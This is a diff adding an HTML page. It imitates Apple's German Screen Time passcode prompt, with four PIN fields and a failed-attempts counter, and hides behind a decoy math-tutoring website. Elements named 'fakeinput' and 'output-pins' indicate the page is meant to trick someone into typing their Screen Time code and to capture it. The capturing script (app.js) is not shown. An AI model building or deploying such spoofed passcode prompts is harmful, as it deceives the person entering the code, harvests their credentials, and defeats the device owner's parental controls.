@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bildschirmzeit-Code eingeben</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="fakeinput">
+        <div class="header">
+            Code eingeben
+            <a href="https://apple.com" style="text-decoration: none; color:blue">Abbrechen</a>
+        </div>
+        <div class="container">
+            <h1>Bildschirmzeit-Code eingeben</h1>
+            <div class="input-container">
+                <input class="circle" type="tel" maxlength="1">
+                <input class="circle" type="tel" maxlength="1">
+                <input class="circle" type="tel" maxlength="1">
+                <input class="circle" type="tel" maxlength="1">
+            </div>
+            <p id="failed-attempts" class="versteckt"></p>
+        </div>
+    </div>
+    <div id="nachhilfe">
+        
+        <header>
+            <nav>
+                <div class="container">
+                    <h1>Nachhilfe in Mathe</h1>
+                    <ul>
+                        <li><a href="#home">Startseite</a></li>
+                        <li><a href="#services">Dienstleistungen</a></li>
+                        <li><a href="#about">Über Uns</a></li>
+                        <li><a href="#contact">Kontakt</a></li>
+                    </ul>
+                </div>
+            </nav>
+        </header>
+
+        <section id="home" class="hero">
+            <div class="container">
+                <h2>Willkommen bei unserer Mathe-Nachhilfe</h2>
+                <p>Holen Sie sich die Hilfe, die Sie für Mathe benötigen.</p>
+                <a href="#contact" class="cta-button">Jetzt kontaktieren</a>
+            </div>
+        </section>
+
+        <section id="services">
+            <div class="container">
+                <h2>Unsere Dienstleistungen</h2>
+                <div class="service">
+                    <h3>Einzelunterricht</h3>
+                    <p>Individuelle Betreuung für besseres Verständnis.</p>
+                </div>
+                <div class="service">
+                    <h3>Gruppenunterricht</h3>
+                    <p>Lernen Sie in einer motivierenden Gruppenumgebung.</p>
+                </div>
+                <div class="service">
+                    <h3>Online-Kurse</h3>
+                    <p>Flexibles Lernen von überall aus.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="about">
+            <div class="container">
+                <h2>Über Uns</h2>
+                <p>Wir sind ein engagiertes Team von Mathe-Experten, die Ihnen helfen, Ihre mathematischen Fähigkeiten zu verbessern.</p>
+            </div>
+        </section>
+
+        <section id="contact">
+            <div class="container">
+                <h2>Kontaktieren Sie uns</h2>
+                <p>Haben Sie Fragen oder möchten Sie mehr über unsere Dienstleistungen erfahren? Schreiben Sie uns eine Nachricht.</p>
+                <form action="#" method="post">
+                    <label for="name">Name:</label>
+                    <input type="text" id="name" name="name" required>
+                    <label for="email">E-Mail:</label>
+                    <input type="email" id="email" name="email" required>
+                    <label for="message">Nachricht:</label>
+                    <textarea id="message" name="message" rows="4" required></textarea>
+                    <button type="submit" class="cta-button">Senden</button>
+                </form>
+            </div>
+        </section>
+        
+        <span id="output-pins"></span>
+        <span id="output-pins2"></span>
+        <footer>
+            <div class="container">
+                <p>&copy; 2023 Nachhilfe in Mathe</p>
+            </div>
+        </footer>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
